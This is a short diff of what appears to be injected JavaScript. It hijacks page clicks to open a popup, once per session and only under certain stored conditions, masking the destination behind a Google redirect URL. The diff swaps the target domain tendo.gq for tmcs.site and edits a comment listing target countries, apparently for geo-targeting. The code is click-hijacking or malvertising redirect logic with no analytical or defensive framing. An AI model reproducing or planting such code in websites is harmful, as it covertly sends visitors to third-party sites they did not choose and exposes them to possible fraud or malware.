@@ -13,11 +13,11 @@ if(!localStorage.xrd){
 function uhd(){
   document.onclick=()=>{
     if(!sessionStorage.i&&localStorage.mumb&&dtm==3&&dts==5){
-        window.open('https://www.google.com/url?q=https%3A%2F%2Ftendo.gq'); 
+        window.open('https://www.google.com/url?q=https%3A%2F%2Ftmcs.site'); 
     }
     sessionStorage.i='i';
   }
 }
 uhd()
 
-// Morocco|United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
+// United States|Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Lithuania
